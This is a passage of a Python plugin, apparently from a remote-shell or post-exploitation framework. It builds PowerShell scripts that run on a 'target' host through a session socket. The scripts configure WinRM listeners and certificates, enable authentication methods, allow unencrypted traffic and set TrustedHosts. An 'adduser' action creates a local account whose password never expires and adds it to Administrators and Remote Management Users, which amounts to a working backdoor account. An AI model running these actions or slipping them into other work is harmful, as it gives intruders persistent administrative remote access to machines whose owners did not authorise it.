      $result.error='One or more WinRM start steps failed'
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_adduser_command(username: str, password: str):
    user_json, pass_json = json.dumps(username), json.dumps(password)

    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$user={user_json};$pass={pass_json}
$result=[ordered]@{{action='adduser';ok=$false;user=$user;steps=@()}}
{_ADMIN_CHECK}

function NetStep($name,[string[]]$a){{
  try{{
    $o=& "$env:SystemRoot\System32\net.exe" @a 2>&1|Out-String
    $c=$LASTEXITCODE
    [ordered]@{{step=$name;ok=($c-eq 0);exit_code=$c;detail=(($o-replace'\s+',' ').Trim())}}
  }}catch{{
    [ordered]@{{step=$name;ok=$false;exit_code=-1;detail=$_.Exception.Message}}
  }}
}}

try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}else{{
    $hasNewLocalUser = $null -ne (Get-Command New-LocalUser -EA 0)
    $hasAddLocalGroupMember = $null -ne (Get-Command Add-LocalGroupMember -EA 0)

    if($hasNewLocalUser -and $hasAddLocalGroupMember){{
      try{{
        $sec=ConvertTo-SecureString $pass -AsPlainText -Force
        New-LocalUser -Name $user -Password $sec -AccountNeverExpires -PasswordNeverExpires -EA Stop | Out-Null
        $result.steps+=@{{step='create_user';ok=$true;detail='Created via New-LocalUser'}}

        try{{
          Add-LocalGroupMember -Group 'Administrators' -Member $user -EA Stop
          $result.steps+=@{{step='administrators';ok=$true;detail='Added to Administrators'}}
        }}catch{{
          $result.steps+=@{{step='administrators';ok=$false;detail=$_.Exception.Message}}
        }}

        try{{
          Add-LocalGroupMember -Group 'Remote Management Users' -Member $user -EA Stop
          $result.steps+=@{{step='remote_management_users';ok=$true;detail='Added to Remote Management Users'}}
        }}catch{{
          $result.steps+=@{{step='remote_management_users';ok=$false;detail=$_.Exception.Message}}
        }}
      }}catch{{
        $result.steps+=@{{step='create_user';ok=$false;detail=("New-LocalUser failed: "+$_.Exception.Message)}}
      }}
    }}else{{
      $result.steps+=NetStep 'create_user' @('user',$user,$pass,'/add')
      $result.steps+=NetStep 'administrators' @('localgroup','Administrators',$user,'/add')
      $result.steps+=NetStep 'remote_management_users' @('localgroup','Remote Management Users',$user,'/add')
    }}

    $failed=@($result.steps|Where-Object{{-not $_.ok}})
    $result.ok=$failed.Count -eq 0
    if($result.ok){{
      $result.message="User '$user' created with Administrators and Remote Management Users membership"
    }}else{{
      $result.error="Failed step(s): $(($failed|ForEach-Object {{ $_.step }})-join ', ')"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}

Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_listener_list_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='listener list';ok=$true;count=0;listeners=@()}}
{_WSMAN_CHECK}
try{{
  if(-not $__wsmanOk){{
    $result.ok=$false
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $listeners=@()
    Get-ChildItem WSMan:\localhost\Listener -EA 0|ForEach-Object{{
      $entry=[ordered]@{{id=$_.PSChildName}}
      Get-ChildItem $_.PSPath -EA 0|ForEach-Object{{
        $entry[$_.PSChildName]=[string]$_.Value
      }}
      $listeners+=@($entry)
    }}
    $result.listeners=$listeners
    $result.count=$listeners.Count
    if($listeners.Count -eq 0){{ $result.message='No WinRM listeners configured' }}
  }}
}}catch{{
  $result.ok=$false
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_listener_create_http_command(address: str):
    addr_json = json.dumps(address)
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$address={addr_json}
$result=[ordered]@{{action='listener create-http';ok=$false;address=$address;steps=@()}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
{_FIND_LISTENER_SNIPPET}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $existing=@(Find-WinRMListeners -Selector $address -Transport 'HTTP')
    if($existing.Count -gt 0){{
      $result.steps+=@{{step='check';ok=$true;detail="HTTP listener already exists matching '$address'"}}
      $result.ok=$true
      $result.message="HTTP listener already exists matching '$address'"
    }}else{{
      $out=winrm create "winrm/config/Listener?Address=$address+Transport=HTTP" 2>&1|Out-String
      $c=$LASTEXITCODE
      $result.steps+=@{{step='create';ok=($c-eq 0);exit_code=$c;detail=(($out -replace '\s+',' ').Trim())}}
      $result.ok=($c-eq 0)
      if($result.ok){{
        $result.message="HTTP listener created at $address (port 5985)"
      }}else{{
        $result.error='Failed to create HTTP listener'
      }}
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_listener_create_https_command(address: str, thumbprint: str):
    addr_json = json.dumps(address)
    thumb_json = json.dumps(thumbprint.upper().replace(' ', ''))
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$address={addr_json};$thumb={thumb_json}
$result=[ordered]@{{action='listener create-https';ok=$false;address=$address;thumbprint=$thumb;steps=@()}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
{_FIND_LISTENER_SNIPPET}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $cert=Get-Item "Cert:\LocalMachine\My\$thumb" -EA 0
    if(-not $cert){{
      $result.error="Certificate with thumbprint $thumb not found in Cert:\LocalMachine\My"
    }}elseif(-not $cert.HasPrivateKey){{
      $result.error="Certificate $thumb does not have a private key"
    }}else{{
      $result.steps+=@{{step='certificate';ok=$true;detail=$cert.Subject}}

      $existing=@(Find-WinRMListeners -Selector $address -Transport 'HTTPS')
      foreach($l in $existing){{
        Remove-Item $l.PSPath -Recurse -Force -EA 0
      }}
      if($existing.Count -gt 0){{
        $result.steps+=@{{step='cleanup';ok=$true;detail="Removed $($existing.Count) existing HTTPS listener(s) matching '$address'"}}
      }}

      New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address $address `
        -CertificateThumbPrint $thumb -Force -EA Stop|Out-Null
      $result.steps+=@{{step='create';ok=$true;detail="HTTPS listener created at $address (port 5986)"}}
      $result.ok=$true
      $result.message="HTTPS listener created at $address using certificate $thumb"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_listener_remove_command(selector: str):
    sel_json = json.dumps(selector)
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$selector={sel_json}
$result=[ordered]@{{action='listener remove';ok=$false;selector=$selector;removed=@()}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
{_FIND_LISTENER_SNIPPET}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $targets=@(Find-WinRMListeners -Selector $selector)
    if($targets.Count -eq 0){{
      $result.error="No listeners found matching '$selector'"
    }}else{{
      foreach($l in $targets){{
        $transport=(Get-Item "$($l.PSPath)\Transport" -EA 0).Value
        $addr=(Get-Item "$($l.PSPath)\Address" -EA 0).Value
        Remove-Item $l.PSPath -Recurse -Force -EA 0
        $result.removed+="$($l.PSChildName) [$transport $addr]"
      }}
      $result.ok=$true
      $result.message="Removed $($result.removed.Count) listener(s) matching '$selector'"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_client_config_get_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='client-config get';ok=$true;settings=@{{}}}}
{_WSMAN_CHECK}
try{{
  if(-not $__wsmanOk){{
    $result.ok=$false
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $settings=[ordered]@{{}}
    $settings['TrustedHosts']=[string](Get-Item WSMan:\localhost\Client\TrustedHosts -EA 0).Value
    $settings['AllowUnencrypted']=[string](Get-Item WSMan:\localhost\Client\AllowUnencrypted -EA 0).Value
    Get-ChildItem WSMan:\localhost\Client\Auth -EA 0|ForEach-Object{{
      $settings['Auth_'+$_.Name]=[string]$_.Value
    }}
    $result.settings=$settings
  }}
}}catch{{
  $result.ok=$false
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_client_config_set_trustedhosts_command(hosts: str):
    hosts_json = json.dumps(hosts)
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$value={hosts_json}
$result=[ordered]@{{action='client-config set-trustedhosts';ok=$false;value=$value}}
{_ADMIN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}else{{
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value $value -Force -EA Stop
    $new=[string](Get-Item WSMan:\localhost\Client\TrustedHosts -EA 0).Value
    $result.ok=$true
    $result.message="TrustedHosts set to '$new'"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_client_config_set_allowunencrypted_command(value: bool):
    val = 'true' if value else 'false'
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='client-config set-allowunencrypted';ok=$false;value='{val}'}}
{_ADMIN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}else{{
    Set-Item WSMan:\localhost\Client\AllowUnencrypted -Value ${val} -Force -EA Stop
    $new=[string](Get-Item WSMan:\localhost\Client\AllowUnencrypted -EA 0).Value
    $result.ok=$true
    $result.message="AllowUnencrypted set to '$new'"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


_SERVICE_AUTH_METHODS = ['Basic', 'Certificate', 'CredSSP', 'Digest', 'Kerberos', 'Negotiate']
_CLIENT_AUTH_METHODS = ['Basic', 'CredSSP', 'Digest', 'Kerberos', 'Negotiate']

_ALL_AUTH_METHODS = sorted(set(_SERVICE_AUTH_METHODS) | set(_CLIENT_AUTH_METHODS))


def _normalize_auth_method(name):
    n = (name or '').strip().lower()
    if not n:
        return None
    canonical = {
        'basic': 'Basic',
        'certificate': 'Certificate',
        'cert': 'Certificate',
        'credssp': 'CredSSP',
        'digest': 'Digest',
        'kerberos': 'Kerberos',
        'negotiate': 'Negotiate',
        'ntlm': 'Negotiate',
    }
    return canonical.get(n)


def _build_auth_list_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='auth list';ok=$true;service=@{{}};client=@{{}}}}
{_WSMAN_CHECK}
try{{
  if(-not $__wsmanOk){{
    $result.ok=$false
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    Get-ChildItem WSMan:\localhost\Service\Auth -EA 0|ForEach-Object{{
      $result.service[$_.Name]=[string]$_.Value
    }}
    Get-ChildItem WSMan:\localhost\Client\Auth -EA 0|ForEach-Object{{
      $result.client[$_.Name]=[string]$_.Value
    }}
  }}
}}catch{{
  $result.ok=$false
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_auth_set_command(method: str, side: str, enabled: bool) -> str:
    assert side in ('service', 'client')
    assert method in _SERVICE_AUTH_METHODS
    action = f'auth {"enable" if enabled else "disable"}'
    side_lc = side
    side_uc = 'Service' if side == 'service' else 'Client'
    val = '$true' if enabled else '$false'
    val_str = 'true' if enabled else 'false'
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='{action}';ok=$false;method='{method}';side='{side_lc}';value='{val_str}';steps=@()}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $path='WSMan:\localhost\{side_uc}\Auth\{method}'
    if(-not (Test-Path $path)){{
      $result.error="Auth method '{method}' not available on the {side_lc} side of this host"
    }}else{{
      $before=[string](Get-Item $path -EA 0).Value
      Set-Item -Path $path -Value {val} -Force -EA Stop
      $after=[string](Get-Item $path -EA 0).Value
      $result.steps+=@{{step='before';ok=$true;detail="$before"}}
      $result.steps+=@{{step='after';ok=$true;detail="$after"}}
      if($after -eq '{val_str}'){{
        $result.ok=$true
        $result.message="Set WSMan:\localhost\{side_uc}\Auth\{method} = {val_str} (was $before)"
      }}else{{
        $result.error="Set-Item did not take effect (still $after); the WSMan provider may not allow changing {method} on this build"
      }}
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_cert_list_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='cert list';ok=$true;count=0;certificates=@()}}
{_WSMAN_CHECK}
try{{
  if(-not $__wsmanOk){{
    $result.ok=$false
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $certs=@()
    Get-ChildItem WSMan:\localhost\Listener -EA 0|ForEach-Object{{
      $l=$_
      $thumb=(Get-Item "$($l.PSPath)\CertificateThumbprint" -EA 0).Value
      if($thumb){{
        $entry=[ordered]@{{
          listener=$l.PSChildName
          address=(Get-Item "$($l.PSPath)\Address" -EA 0).Value
          transport=(Get-Item "$($l.PSPath)\Transport" -EA 0).Value
          port=(Get-Item "$($l.PSPath)\Port" -EA 0).Value
          thumbprint=[string]$thumb
        }}
        $c=Get-Item "Cert:\LocalMachine\My\$thumb" -EA 0
        if($c){{
          $entry['subject']=[string]$c.Subject
          $entry['not_after']=[string]$c.NotAfter
          $entry['has_private_key']=[string]$c.HasPrivateKey
        }}else{{
          $entry['subject']='<not found in LocalMachine\My>'
        }}
        $certs+=@($entry)
      }}
    }}
    $result.certificates=$certs
    $result.count=$certs.Count
    if($certs.Count -eq 0){{ $result.message='No certificates bound to WinRM listeners' }}
  }}
}}catch{{
  $result.ok=$false
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_cert_bind_command(address: str, thumbprint: str):
    addr_json = json.dumps(address)
    thumb_json = json.dumps(thumbprint.upper().replace(' ', ''))
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$address={addr_json};$thumb={thumb_json}
$result=[ordered]@{{action='cert bind';ok=$false;address=$address;thumbprint=$thumb;steps=@();source='target-thumb'}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $cert=Get-Item "Cert:\LocalMachine\My\$thumb" -EA 0
    if(-not $cert){{
      $result.error="Certificate with thumbprint $thumb not found in Cert:\LocalMachine\My"
    }}elseif(-not $cert.HasPrivateKey){{
      $result.error="Certificate $thumb does not have a private key"
    }}else{{
      $result.steps+=@{{step='certificate';ok=$true;detail=$cert.Subject}}
      Get-ChildItem WSMan:\localhost\Listener -EA 0|Where-Object{{
        (Get-Item "$($_.PSPath)\Transport" -EA 0).Value -eq 'HTTPS' -and
        (Get-Item "$($_.PSPath)\Address" -EA 0).Value -eq $address
      }}|ForEach-Object{{
        Remove-Item $_.PSPath -Recurse -Force -EA 0
      }}
      New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address $address `
        -CertificateThumbPrint $thumb -Force -EA Stop|Out-Null
      $result.steps+=@{{step='bind';ok=$true;detail="Bound cert to HTTPS listener at $address"}}
      $result.ok=$true
      $result.message="Certificate $thumb bound to HTTPS listener at $address"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_cert_import_and_bind_command(address: str, pfx_base64: str):
    b64_json = json.dumps(pfx_base64)
    addr_json = json.dumps(address)
    pw_json = json.dumps(_PFX_PASSWORD)
    return rf"""
$ErrorActionPreference='Stop'
$ProgressPreference='SilentlyContinue'
$ConfirmPreference='None'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$address={addr_json}
$pfxB64={b64_json}
$pfxPw={pw_json}
$result=[ordered]@{{action='cert bind';ok=$false;address=$address;steps=@();source='local-pfx'}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $tmp=[IO.Path]::Combine($env:TEMP, 'winrm-' + [Guid]::NewGuid().ToString('N') + '.pfx')
    [IO.File]::WriteAllBytes($tmp, [Convert]::FromBase64String($pfxB64))
    $result.steps+=@{{step='decode';ok=$true;detail="Wrote $tmp"}}

    $secpw=ConvertTo-SecureString $pfxPw -AsPlainText -Force
    $imported=Import-PfxCertificate -FilePath $tmp -CertStoreLocation Cert:\LocalMachine\My -Password $secpw -EA Stop
    Remove-Item $tmp -Force -EA 0

    if(-not $imported -or -not $imported.Thumbprint){{
      $result.steps+=@{{step='import';ok=$false;detail='Import-PfxCertificate returned no cert'}}
      $result.error='PFX import failed'
    }}else{{
      $thumb=$imported.Thumbprint
      $result.Add('thumbprint', $thumb)
      $result.steps+=@{{step='import';ok=$true;detail="Imported $thumb"}}

      $removed=0
      Get-ChildItem WSMan:\localhost\Listener -EA 0|Where-Object{{
        (Get-Item "$($_.PSPath)\Transport" -EA 0).Value -eq 'HTTPS' -and
        (Get-Item "$($_.PSPath)\Address" -EA 0).Value -eq $address
      }}|ForEach-Object{{
        Remove-Item $_.PSPath -Recurse -Force -EA 0
        $removed++
      }}
      if($removed -gt 0){{
        $result.steps+=@{{step='cleanup';ok=$true;detail="Removed $removed existing HTTPS listener(s) matching '$address'"}}
      }}

      New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address $address `
        -CertificateThumbPrint $thumb -Force -EA Stop|Out-Null
      $result.steps+=@{{step='bind';ok=$true;detail="Bound to HTTPS listener at $address"}}
      $result.ok=$true
      $result.message="Local PFX imported (thumb $thumb) and bound to HTTPS listener at $address"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _build_cert_unbind_command(address: str):
    addr_json = json.dumps(address)
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$address={addr_json}
$result=[ordered]@{{action='cert unbind';ok=$false;address=$address;removed=@()}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $targets=@()
    Get-ChildItem WSMan:\localhost\Listener -EA 0|Where-Object{{
      (Get-Item "$($_.PSPath)\Transport" -EA 0).Value -eq 'HTTPS' -and
      (Get-Item "$($_.PSPath)\Address" -EA 0).Value -eq $address
    }}|ForEach-Object{{ $targets+=$_ }}
    if($targets.Count -eq 0){{
      $result.error="No HTTPS listener found at address '$address'"
    }}else{{
      foreach($l in $targets){{
        Remove-Item $l.PSPath -Recurse -Force -EA 0
        $result.removed+=$l.PSChildName
      }}
      $result.ok=$true
      $result.message="Removed $($result.removed.Count) HTTPS listener(s) at $address (certificate binding removed)"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _format_action_report(data: dict) -> str:
    action = data.get('action', 'winrm')
    lines = []
    if data.get('ok'):
        lines.append(f"WinRM {action}: success")
    else:
        lines.append(f"WinRM {action}: failed")
    if data.get('message'):
        lines.append(str(data['message']))
    if data.get('error'):
        lines.append(f"Error: {data['error']}")
    if data.get('output'):
        lines.append(str(data['output']).strip())

    for step in data.get('steps') or []:
        status = 'ok' if step.get('ok') else 'failed'
        detail = step.get('detail') or step.get('step') or ''
        label = step.get('step') or 'step'
        lines.append(f"  [{status}] {label}: {detail}".rstrip(': '))

    for lst in data.get('listeners') or []:
        addr = lst.get('Address', lst.get('address', '?'))
        transport = lst.get('Transport', lst.get('transport', '?'))
        enabled = lst.get('Enabled', lst.get('enabled', '?'))
        port = lst.get('Port', lst.get('port', '?'))
        lines.append(f"  - {lst.get('id','?')}: {transport} {addr}:{port} Enabled={enabled}")

    for c in data.get('certificates') or []:
        lines.append(
            f"  - {c.get('listener','?')}: {c.get('transport','?')} {c.get('address','?')} "
            f"thumb={c.get('thumbprint','?')} subject={c.get('subject','?')}"
        )

    settings = data.get('settings')
    if isinstance(settings, dict):
        for k, v in settings.items():
            lines.append(f"  {k} = {v}")

    svc = data.get('service')
    cli = data.get('client')
    if isinstance(svc, dict) and svc:
        lines.append("  Service-side auth:")
        for k in sorted(svc.keys()):
            lines.append(f"    {k} = {svc[k]}")
    if isinstance(cli, dict) and cli:
        lines.append("  Client-side auth:")
        for k in sorted(cli.keys()):
            lines.append(f"    {k} = {cli[k]}")

    if data.get('removed'):
        lines.append("  removed: " + ", ".join(map(str, data['removed'])))
    if data.get('changed'):
        lines.append("  changed: " + ", ".join(map(str, data['changed'])))
    if data.get('failed'):
        lines.append("  failed: " + ", ".join(map(str, data['failed'])))

    return '\n'.join(lines)


def _run_winrm_action(
    session: SessionContext,
    plugin_name: str,
    win_ps: str,
    timeout: float = 45.0,
) -> int:
    session.log_event(f'Plugin {plugin_name}: action started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    raw = session.run_marked(
        'true',
        win_ps,
        timeout=timeout,
        start_mark=PLUGIN_MARK_START,
        end_mark=PLUGIN_MARK_END,
        strip_ws=False,
    )

    if raw is None:
        session.print(f"Plugin '{plugin_name}' failed — no response from target.", 'red')
        session.log_plugin_result(plugin_name, '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print(f"Plugin '{plugin_name}' failed — could not parse results.", 'red')
        session.log_plugin_result(plugin_name, raw[:4000], 'parse error')
        return 1

    report = _format_action_report(data)
    ok = bool(data.get('ok'))
    session.print(report, 'green' if ok else 'red')
    session.log_plugin_result(plugin_name, report, json.dumps(data, indent=2))
    session.log_command(f'run {plugin_name}', report)
    return 0 if ok else 1


def _handle_listener(session: SessionContext, args):
    if not args or args[0].lower() in ('list', 'ls'):
        return _run_winrm_action(
            session, 'winrm listener list', _build_listener_list_command()
        )

    sub = args[0].lower()
    rest = args[1:]

    if sub in ('create-http', 'create_http', 'http'):
        address = rest[0] if rest else '*'
        return _run_winrm_action(
            session, 'winrm listener create-http',
            _build_listener_create_http_command(address),
        )

    if sub in ('create-https', 'create_https', 'https'):
        if not rest:
            session.print("Error: listener create-https requires a certificate thumbprint.", 'red')
            session.print(WINRM_USAGE, 'yellow')
            return 1
        thumb = rest[0].strip()
        address = rest[1] if len(rest) > 1 else '*'
        if not thumb:
            session.print("Error: listener create-https requires a non-empty thumbprint.", 'red')
            return 1
        return _run_winrm_action(
            session, 'winrm listener create-https',
            _build_listener_create_https_command(address, thumb),
            timeout=60.0,
        )

    if sub in ('remove', 'rm', 'delete', 'del'):
        if not rest:
            session.print("Error: listener remove requires a listener ID or address.", 'red')
            return 1
        return _run_winrm_action(
            session, 'winrm listener remove',
            _build_listener_remove_command(rest[0]),
        )

    session.print(f"Unknown listener subcommand: {args[0]}", 'red')
    session.print(WINRM_USAGE, 'yellow')
    return 1


def _handle_client_config(session: SessionContext, args):
    if not args or args[0].lower() in ('get', 'show', 'list'):
        return _run_winrm_action(
            session, 'winrm client-config get', _build_client_config_get_command()
        )

    sub = args[0].lower()
    rest = args[1:]

    if sub in ('set-trustedhosts', 'trustedhosts'):
        if not rest:
            session.print("Error: client-config set-trustedhosts requires a value (use '' to clear).", 'red')
            return 1
        value = ' '.join(rest).strip()
        return _run_winrm_action(
            session, 'winrm client-config set-trustedhosts',
            _build_client_config_set_trustedhosts_command(value),
        )

    if sub in ('set-allowunencrypted', 'allowunencrypted'):
        if not rest:
            session.print("Error: client-config set-allowunencrypted requires true or false.", 'red')
            return 1
        v = rest[0].strip().lower()
        if v not in ('true', 'false', '1', '0', 'yes', 'no'):
            session.print("Error: value must be true or false.", 'red')
            return 1
        enabled = v in ('true', '1', 'yes')
        return _run_winrm_action(
            session, 'winrm client-config set-allowunencrypted',
            _build_client_config_set_allowunencrypted_command(enabled),
        )

    session.print(f"Unknown client-config subcommand: {args[0]}", 'red')
    session.print(WINRM_USAGE, 'yellow')
    return 1


def _handle_auth(session: SessionContext, args):
    if not args or args[0].lower() in ('list', 'ls', 'show'):
        return _run_winrm_action(session, 'winrm auth list', _build_auth_list_command())

    sub = args[0].lower()
    rest = args[1:]

    if sub in ('enable', 'enable-service'):
        side, enabled = 'service', True
    elif sub in ('disable', 'disable-service'):
        side, enabled = 'service', False
    elif sub == 'enable-client':
        side, enabled = 'client', True
    elif sub == 'disable-client':
        side, enabled = 'client', False
    else:
        session.print(f"Unknown auth subcommand: {args[0]}", 'red')
        session.print(WINRM_USAGE, 'yellow')
        return 1

    if not rest:
        session.print(f"Error: auth {sub} requires a method name "
                      f"({', '.join(_ALL_AUTH_METHODS)}).", 'red')
        return 1

    method = _normalize_auth_method(rest[0])
    if not method:
        session.print(
            f"Error: unknown auth method '{rest[0]}'. "
            f"Valid: {', '.join(_ALL_AUTH_METHODS)}",
            'red',
        )
        return 1

    if side == 'client' and method not in _CLIENT_AUTH_METHODS:
        session.print(
            f"Error: '{method}' is only available on the service side "
            f"(valid client methods: {', '.join(_CLIENT_AUTH_METHODS)}).",
            'red',
        )
        return 1

    action = f'winrm auth {"enable" if enabled else "disable"}'
    return _run_winrm_action(
        session, action,
        _build_auth_set_command(method, side, enabled),
    )


def _looks_like_pfx_path(arg: str) -> bool:
    lower = arg.lower()
    return (
        lower.endswith('.pfx')
        or lower.endswith('.p12')
        or '/' in arg
        or '\\' in arg
        or (os.path.exists(arg) and not _looks_like_thumbprint(arg))
    )


def _looks_like_thumbprint(arg: str) -> bool:
    if len(arg) != 40:
        return False
    try:
        int(arg, 16)
        return True
    except ValueError:
        return False


def _handle_create_local(session: SessionContext, dns_name: str, purpose: str = 'server') -> int:
    if not dns_name:
        dns_name = 'localhost'
    session.print(
        f"Generating self-signed certificate locally with openssl for '{dns_name}' "
        f"(purpose={purpose}, into {_LOCAL_CERT_DIR})...",
        'yellow',
    )
    info = _generate_selfsigned_local(dns_name, purpose=purpose)
    if not info.get('ok'):
        session.print(f"Error: {info.get('error', 'unknown error')}", 'red')
        return 1
    _print_local_cert_details(session, info)
    return 0


def _handle_bind_local_pfx(session: SessionContext, pfx_path: str, address: str) -> int:
    if not os.path.isfile(pfx_path):
        session.print(f"Error: PFX file not found: {pfx_path}", 'red')
        return 1
    try:
        with open(pfx_path, 'rb') as f:
            data = f.read()
    except Exception as exc:
        session.print(f"Error reading {pfx_path}: {exc}", 'red')
        return 1

    pfx_b64 = base64.b64encode(data).decode('ascii')
    session.print(
        f"Uploading {pfx_path} ({len(data)} bytes, base64 {len(pfx_b64)} chars) "
        f"to target and binding at '{address}'...",
        'yellow',
    )

    return _run_winrm_action(
        session, 'winrm cert bind',
        _build_cert_import_and_bind_command(address, pfx_b64),
        timeout=90.0,
    )


def _handle_cert(session: SessionContext, args):
    if not args or args[0].lower() in ('list', 'ls'):
        return _run_winrm_action(session, 'winrm cert list', _build_cert_list_command())

    sub = args[0].lower()
    rest = args[1:]

    if sub in ('create-selfsigned', 'selfsigned', 'create-self-signed'):
        purpose = 'server'
        name = ''
        for a in rest:
            la = a.lower()
            if la == '--client':
                purpose = 'client'
            elif la == '--both':
                purpose = 'both'
            elif la == '--server':
                purpose = 'server'
            elif not name:
                name = a.strip()
        return _handle_create_local(session, name, purpose=purpose)

    if sub == 'bind':
        if not rest:
            session.print("Error: cert bind requires a thumbprint or a local .pfx path.", 'red')
            return 1
        first = rest[0].strip()
        address = rest[1] if len(rest) > 1 else '*'

        if not first:
            session.print("Error: cert bind requires a non-empty thumbprint or PFX path.", 'red')
            return 1

        if _looks_like_pfx_path(first) and not _looks_like_thumbprint(first):
            return _handle_bind_local_pfx(session, first, address)

        return _run_winrm_action(
            session, 'winrm cert bind',
            _build_cert_bind_command(address, first),
